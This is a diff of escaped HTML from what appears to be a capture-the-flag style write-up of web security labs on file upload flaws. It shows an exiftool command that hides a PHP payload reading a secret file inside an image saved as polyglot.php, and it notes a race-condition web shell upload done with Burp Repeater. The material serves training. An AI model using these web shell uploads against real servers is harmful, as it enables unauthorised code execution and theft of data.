+&lt;div&gt;&lt;pre&gt;&lt;code&gt;exiftool -Comment=&amp;#34;&amp;lt;?php echo &amp;#39;START &amp;#39; .file_get_contents(&amp;#39;/home/carlos/secret&amp;#39;) . &amp;#39; END&amp;#39;; ?&amp;gt;&amp;#34; &amp;lt;YOUR-INPUT-IMAGE&amp;gt;.jpg -o polyglot.php
 # START and END will be useful in order to facilitate the content&amp;#39;s visualization.
-# The image will be saved as &amp;#34;polyglot.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+# The image will be saved as &amp;#34;polyglot.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
   &lt;button
     class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
     title=&#34;Copy code&#34;
@@ -782,8 +742,6 @@ Executed the code&lt;/p&gt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;The command above edits an image and inserts a PHP code as the “Comment” value of the image&amp;rsquo;s metadata. When we access the file, that part of it will be replaced with the contents of the file fetched in the PHP code.&lt;/p&gt;
 &lt;h4&gt;Lab: Remote code execution via polyglot web shell upload&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;lab-remote-code-execution-via-polyglot-web-shell-upload&#34;&gt;&lt;/span&gt;
@@ -795,7 +753,6 @@ Executed the code&lt;/p&gt;
     &lt;a href=&#34;#lab-web-shell-upload-via-race-condition&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;On this lab, there are many restrictions on file upload, but we can bypass them by sending the request that uploads the file and the one that accesses it at the same time.&lt;/p&gt;
 &lt;p&gt;As we can see in the lab’s hint, the PHP script responsible for the file upload function moves the file to the uploads directory before actually validating it’s content.&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
-  
 
 &lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$target_dir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;avatars/&amp;#34;&lt;/span&gt;;
@@ -836,8 +793,6 @@ Executed the code&lt;/p&gt;
     &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
   &lt;/button&gt;
 &lt;/div&gt;
-
-  
 &lt;/div&gt;
 &lt;p&gt;We can use burp repeater to send both requests in a single packet.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;image-12.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
